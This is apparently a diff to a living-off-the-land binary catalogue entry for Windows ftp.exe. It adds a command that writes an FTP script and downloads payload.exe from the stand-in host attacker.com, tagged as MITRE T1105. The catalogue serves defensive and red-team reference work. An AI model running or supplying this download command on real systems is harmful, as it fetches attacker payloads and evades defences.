@@ -12,6 +12,14 @@ Commands:
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10
+  - Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+    Description: Download
+    Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    MitreLink: https://attack.mitre.org/wiki/Technique/T1105
+    OperatingSystem: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\ftp.exe
   - Path: C:\Windows\SysWOW64\ftp.exe
@@ -23,6 +31,7 @@ Resources:
   - Link: https://twitter.com/0xAmit/status/1070063130636640256
   - Link: https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939
   - Link: https://ss64.com/nt/ftp.html
+  - Link: https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/
 Acknowledgement:
   - Person: Casey Smith
     Handle: '@subtee'
